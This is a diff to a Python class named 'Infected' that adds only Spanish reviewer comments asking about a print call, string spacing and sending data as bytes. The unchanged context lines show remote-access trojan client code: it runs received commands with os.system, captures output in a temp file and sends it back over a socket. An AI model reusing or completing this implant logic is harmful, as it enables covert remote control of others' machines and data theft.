@@ -36,7 +36,7 @@ class Infected:
     
     def executeAction(self, action):
         action = action + " > %tmp%/file.txt"
-        print(action)        
+        print(action)        # porque este print?
         os.system(action)  
         self.sendOutput() # se cambia por output mas adelante
     
@@ -46,7 +46,7 @@ class Infected:
         infile = open(path, 'r')
         text = ""
         for line in infile:
-            text += line
+            text += line   #no falta el espacio entre string?
         infile.close()  
         return text        
     
@@ -58,7 +58,7 @@ class Infected:
         
         try:
             # Receive action
-            sock.sendall(bytes(output,"utf-8"))                
+            sock.sendall(bytes(output,"utf-8"))     #no hay una forma de enviarlo , pero no como bytes?           
         finally:
             sock.close()       
     
